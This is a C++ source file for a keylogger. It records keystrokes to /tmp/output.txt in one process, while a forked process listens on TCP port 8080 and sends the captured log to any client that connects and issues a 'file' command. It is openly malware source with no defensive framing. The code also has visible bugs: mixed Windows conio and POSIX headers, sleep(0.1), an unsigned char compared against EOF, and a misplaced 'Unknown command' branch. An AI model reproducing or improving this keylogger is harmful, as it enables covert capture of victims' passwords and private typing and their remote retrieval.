#include <iostream>
#include <fstream>
#include <cstring>

#include <stdio.h>
#include <unistd.h>
#include <conio.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// Networking variables
#define IP "127.0.0.1"
#define PORT 8080
#define BACKLOG 10

// Keylogging variables
#define OUTPUT_FILE "/tmp/output.txt"

using namespace std;

int establish_network();
int upload_file(int sockfd);
int keylog();

int main() {

  pid_t pid = fork();

  if (pid == 0) {
    // Create server/client model
    int network_connection = establish_network();
    if (network_connection) {
      puts("Error: Could not establish a network");
      exit(-1);
    }
  }

  int key = keylog();
  if (key) {
    puts("Error: Could not start keylogger");
    exit(-1);
  }

  puts("Program ran without errors");
  return 0;
}

int establish_network() {
  
  int sockfd, new_sockfd, recv_cmd, up;
  char buffer[1024];
  struct sockaddr_in serv_addr, client_addr;
  socklen_t sin_size;

  // Create socket
  puts("Creating Socket...");
  sockfd = socket(AF_INET,SOCK_STREAM,0);
  if (sockfd == -1) {
    puts("Error: Could not create socket...");
    return -1;
  }

  // Assign IP and port address for server
  memset(&serv_addr, 0, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);
  inet_aton(IP, &(serv_addr.sin_addr));

  // Bind socket
  puts("Binding socket");
  if (bind(sockfd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) == -1) {
    puts("Error: Could not bind socket");
    return -1;
  }

  // Begin listening
  puts("Listening...");
  if (listen(sockfd, BACKLOG) == -1) {
    puts("Error: Socket could not listen");
    return -1;
  }

  puts("Accepting connection...");
  while (1) {

    // Accept connections
    sin_size = sizeof(struct sockaddr_in);
    new_sockfd = accept(sockfd, (struct sockaddr *) &client_addr, &sin_size);
    if (new_sockfd == -1) {
      puts("Error: Could  not accept connection");
      return -1;
    }
    // Send prompt
    send(new_sockfd, "> ", 2, 0);

    // Receive response
    recv_cmd = recv(new_sockfd, &buffer, 1024, 0);
    if (recv_cmd == -1) {
      puts("Error: Could not receive command");
      return -1;
    }

    if (strcmp("exit\r\n", buffer) == 0) { // exit command. Closes socket and 0's out memory. Begin waiting for new connection.
      close(new_sockfd);
      memset(&buffer, '\0', 1024);
      break;
    } else if (strcmp("file\r\n", buffer) == 0) { // Grab and download file to client
      up = upload_file(new_sockfd);
      if (!up) {

        // Send error message
        memset(&buffer, 0, 1024);
        strcpy(buffer, "Error: Could not retrieve keylog file\n");
        send(new_sockfd, &buffer, sizeof(buffer), 0);

        close(new_sockfd);
        return -1;
      } else {
        strcpy(buffer, "Unknown command\r\n");
        send(new_sockfd, &buffer, sizeof(buffer), 0);
      }
    }

  }

  return 0;
}

int upload_file(int sockfd) {

  unsigned char sym;

  FILE * file = fopen(OUTPUT_FILE,"r");
  if (file != NULL) {
    
    // Read and send contents of keylog file
    while ((sym = getc(file)) != EOF) {
      send(sockfd, &sym, sizeof(sym), 0);
    }

    // Close file handler and return
    fclose(file);
    return 1;
  }

  // Was not able to successfully open file
  return 0;
}

int keylog() {
  // Initialize variables
  ofstream f;
  char capture;

  // Time stuff
  time_t t;
  t = time(NULL);

  // Open and begin reading file
  f.open(OUTPUT_FILE);

  // Begin keylogger
  while (1) {
    sleep(0.1);
    if (kbhit()) {
      capture = getch();

      switch ((int) capture) {
        case ' ':
          f << "[SPACE]" << std::flush;
          break;
        case 0x09:
          f << "[TAB]" << std::flush;
          break;
        case 0x0d:
          f << "[ENTER]" << std::flush;
          break;
        case 0x1b:
          f << "[ESC]" << std::flush;
          break;
        case 0x08:
          f << "[BACKSPACE]" << std::flush;
          break;
        default:
          f << capture << std::flush;
      }
    }
  }

  return 0;
}